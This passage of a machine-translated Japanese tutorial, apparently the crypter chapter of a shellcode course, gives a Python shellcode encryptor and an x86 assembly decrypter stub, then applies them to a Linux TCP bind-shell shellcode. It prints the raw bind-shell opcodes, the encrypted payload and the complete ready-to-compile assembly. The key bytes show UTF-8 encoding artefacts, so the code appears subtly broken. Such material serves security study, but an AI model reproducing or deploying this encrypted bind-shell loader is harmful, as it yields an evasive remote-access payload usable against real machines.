<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.暗号学者</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
コースでは、シェルコードは高水準C言語と補助ライブラリを使用して暗号化されていますが、このタスクをアセンブラで完了することにしました。</font><font style="vertical-align: inherit;">コースは、暗号化アルゴリズムが単純化されているにもかかわらず、アセンブラー専用です。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">crypter.py</font></font></b><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> random<font></font>
<font></font>
<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">2</span>:<font></font>
	print(<span class="hljs-string">"Enter shellcode in hex"</span>)<font></font>
	sys.exit(<span class="hljs-number">0</span>)<font></font>
<font></font>
shellcode = sys.argv[<span class="hljs-number">1</span>]<font></font>
plain_shellcode = bytearray.fromhex(shellcode)<font></font>
<font></font>
<span class="hljs-comment"># Generating key</span><font></font>
key_length = len(plain_shellcode)<font></font>
r = <span class="hljs-string">''</span>.join(chr(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>)) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(key_length))<font></font>
key = bytearray(r.encode())<font></font>
<font></font>
encrypted_shellcode = <span class="hljs-string">""</span>
plain_key = <span class="hljs-string">""</span><font></font>
<font></font>
<span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> range(len(plain_shellcode)):<font></font>
	enc_b = (plain_shellcode[b] + key[b]) &amp; <span class="hljs-number">255</span>
	encrypted_shellcode += <span class="hljs-string">'%02x'</span> % enc_b<font></font>
	plain_key += <span class="hljs-string">'0x'</span>+ <span class="hljs-string">'%02x'</span> % key[b] + <span class="hljs-string">','</span><font></font>
<font></font>
print(<span class="hljs-string">'*'</span>*<span class="hljs-number">150</span>)<font></font>
print(encrypted_shellcode)<font></font>
print(<span class="hljs-string">'*'</span>*<span class="hljs-number">150</span>)<font></font>
print(plain_key)<font></font>
print(<span class="hljs-string">'*'</span>*<span class="hljs-number">150</span>)<font></font>
print(key_length)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
まず、「スケルトン」を作成します。</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; push encrypted shellcode<font></font>
	&lt;PUSH ENCRYPTED SHELLCODE&gt;<font></font>
<font></font>
	jmp getdata<font></font>
next:	pop ebx<font></font>
<font></font>
	mov esi, esp<font></font>
	mov edi, esp<font></font>
	; place key length<font></font>
	mov ecx, &lt;KEY LENGTH&gt;<font></font>
<font></font>
decrypt:<font></font>
	lodsb<font></font>
	sub al, byte [ebx]<font></font>
	inc ebx<font></font>
	stosb<font></font>
	loop decrypt<font></font>
<font></font>
	jmp esp<font></font>
	; exit<font></font>
	xor eax, eax<font></font>
	mov al, 1<font></font>
	xor ebx, ebx<font></font>
	int 0x80<font></font>
<font></font>
<font></font>
getdata: call next<font></font>
	; Place key on next line<font></font>
	key db &lt;CIPHER KEY&gt;</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このコードでは、3つのことが必要です：エンコードされたシェルコード、キーの長さ、および暗号化キー自体を含むプッシュ命令。</font><font style="vertical-align: inherit;">TCPバインドシェルシェルコードを暗号化します。</font><font style="vertical-align: inherit;">オペコードを出力します。</font></font><br>
<br>
<pre><code class="plaintext hljs">$hexopcode bind_tcp_shell <font></font>
31c031db31f6566a016a02b066b30189e1cd8089c25666680929666a0289e16a105152b066b30289e1cd806a0152b066b30489e1cd80565652b066b30589e1cd8089c231c9b10389d349b03fcd8079f931c050682f2f7368682f62696e89e35089e25389e1b00bcd80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
暗号化します：</font></font><br>
<br>
<pre><code class="plaintext hljs">$./crypter.py 31c031db31f6566a016a02b066b30189e1cd8089c25666680929666a0289e16a105152b066b30289e1cd806a0152b066b30489e1cd80565652b066b30589e1cd8089c231c9b10389d349b03fcd8079f931c050682f2f7368682f62696e89e35089e25389e1b00bcd80<font></font>
*******************************Encrypted shellcode*******************************<font></font>
4af2f48df478632d902db527287245fb5d8f38accc18f7b4ccae29ffc514fc2dc614d5e12946c535068f392d921449b111c738a35042da18dd730a75c04b8719c5b93cab8b31554c7fb773fa8f0cb976f37ba483f2bf361ee5f1132c20ba09bf4b86ad4c6f72b78f13<font></font>
***********************************KEY*******************************************<font></font>
0x19,0x32,0xc3,0xb2,0xc3,0x82,0x0d,0xc3,0x8f,0xc3,0xb3,0x77,0xc2,0xbf,0x44,0x72,0x7c,0xc2,0xb8,0x23,0x0a,0xc2,0x91,0x4c,0xc3,0x85,0xc3,0x95,0xc3,0x8b,0x1b,0xc3,0xb6,0xc3,0x83,0x31,0xc3,0x93,0xc3,0xac,0x25,0xc2,0xb9,0xc3,0x91,0xc2,0x99,0x4b,0x5e,0xc3,0xaf,0xc2,0x83,0xc2,0x84,0xc2,0x8b,0xc3,0xa4,0xc2,0xbb,0xc2,0xa6,0x4c,0x45,0x30,0x7a,0x7a,0xc2,0x80,0x52,0xc3,0xac,0x6e,0xc3,0xbb,0xc2,0x8c,0x40,0x7d,0xc2,0xbb,0x54,0x1b,0xc3,0x90,0xc3,0xb6,0x7d,0xc2,0xb1,0xc3,0xb2,0x31,0x26,0x6f,0xc2,0xa4,0x5a,0xc3,0x8e,0xc2,0xac,0xc2,0x93,<font></font>
***********************************KEY LENGTH************************************<font></font>
105</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
結果のプッシュ手順を印刷します。</font></font><br>
<br>
<pre><code class="plaintext hljs">$python3 hex2stack.py 4af2f48df478632d902db527287245fb5d8f38accc18f7b4ccae29ffc514fc2dc614d5e12946c535068f392d921449b111c738a35042da18dd730a75c04b8719c5b93cab8b31554c7fb773fa8f0cb976f37ba483f2bf361ee5f1132c20ba09bf4b86ad4c6f72b78f13<font></font>
	push 0x90909013<font></font>
	push 0x8fb7726f<font></font>
        ...</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
asmファイルに必要なすべてのパラメーターを入力します。</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; push encrypted shellcode<font></font>
	push 0x90909013<font></font>
	push 0x8fb7726f<font></font>
	push 0x4cad864b<font></font>
	push 0xbf09ba20<font></font>
	push 0x2c13f1e5<font></font>
	push 0x1e36bff2<font></font>
	push 0x83a47bf3<font></font>
	push 0x76b90c8f<font></font>
	push 0xfa73b77f<font></font>
	push 0x4c55318b<font></font>
	push 0xab3cb9c5<font></font>
	push 0x19874bc0<font></font>
	push 0x750a73dd<font></font>
	push 0x18da4250<font></font>
	push 0xa338c711<font></font>
	push 0xb1491492<font></font>
	push 0x2d398f06<font></font>
	push 0x35c54629<font></font>
	push 0xe1d514c6<font></font>
	push 0x2dfc14c5<font></font>
	push 0xff29aecc<font></font>
	push 0xb4f718cc<font></font>
	push 0xac388f5d<font></font>
	push 0xfb457228<font></font>
	push 0x27b52d90<font></font>
	push 0x2d6378f4<font></font>
	push 0x8df4f24a<font></font>
<font></font>
	jmp getdata<font></font>
next:	pop ebx<font></font>
<font></font>
	mov esi, esp<font></font>
	mov edi, esp<font></font>
	; place key length<font></font>
	mov ecx, 105<font></font>
<font></font>
decrypt:<font></font>
	lodsb<font></font>
	sub al, byte [ebx]<font></font>
	inc ebx<font></font>
	stosb<font></font>
	loop decrypt<font></font>
<font></font>
	jmp esp<font></font>
	; exit<font></font>
	xor eax, eax<font></font>
	mov al, 1<font></font>
	xor ebx, ebx<font></font>
	int 0x80<font></font>
<font></font>
<font></font>
getdata: call next<font></font>
	; Place key on next line<font></font>
	key db 0x19,0x32,0xc3,0xb2,0xc3,0x82,0x0d,0xc3,0x8f,0xc3,0xb3,0x77,0xc2,0xbf,0x44,0x72,0x7c,0xc2,0xb8,0x23,0x0a,0xc2,0x91,0x4c,0xc3,0x85,0xc3,0x95,0xc3,0x8b,0x1b,0xc3,0xb6,0xc3,0x83,0x31,0xc3,0x93,0xc3,0xac,0x25,0xc2,0xb9,0xc3,0x91,0xc2,0x99,0x4b,0x5e,0xc3,0xaf,0xc2,0x83,0xc2,0x84,0xc2,0x8b,0xc3,0xa4,0xc2,0xbb,0xc2,0xa6,0x4c,0x45,0x30,0x7a,0x7a,0xc2,0x80,0x52,0xc3,0xac,0x6e,0xc3,0xbb,0xc2,0x8c,0x40,0x7d,0xc2,0xbb,0x54,0x1b,0xc3,0x90,0xc3,0xb6,0x7d,0xc2,0xb1,0xc3,0xb2,0x31,0x26,0x6f,0xc2,0xa4,0x5a,0xc3,0x8e,0xc2,0xac,0xc2,0x93,</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
コンパイルします：</font></font><br>
<br>
<pre><code class="plaintext hljs">$nasm32 encrypted_bind</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ファイルからオペコードを取得します。</font></font><br>
<br>
<pre><code class="plaintext hljs">$popcode encrypted_bind</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これらすべてをshellcode.cに入れ、コンパイルして実行します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/84/t5/5t/84t55tdqgrnbbq9lbdh6_798j6a.png" alt="画像"><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考文献</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ファイルと例へのすべてのリンクは</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ここにあります。</font></font></a><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">起源。</font></font></a></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja488404/index.html">2020年に待つ価値のあるゲーム</a></li>
<li><a href="../ja488406/index.html">IPv6-あなたはそれを間違っています</a></li>
<li><a href="../ja488408/index.html">STM32 Ethernet-RS485 IoTゲートウェイ</a></li>
<li><a href="../ja488410/index.html">開発の10年で学んだ7つの教訓</a></li>
<li><a href="../ja488412/index.html">discord.jsに基づくDiscordボットの作成</a></li>
<li><a href="../ja488418/index.html">Spring SecurityとMongoDBを使用したREST API認証</a></li>
<li><a href="../ja488422/index.html">Vueプロジェクトの負担を軽減するための10行のコード</a></li>
<li><a href="../ja488424/index.html">2020年にITSMはどうなりますか？</a></li>
<li><a href="../ja488426/index.html">コードレビューを行う方法は？パート2：ナビゲーション、速度、コメント、競合を確認する</a></li>
<li><a href="../ja488428/index.html">Yandex検索の将来をどのように予測するか：バグ修正から発見クエリまで</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>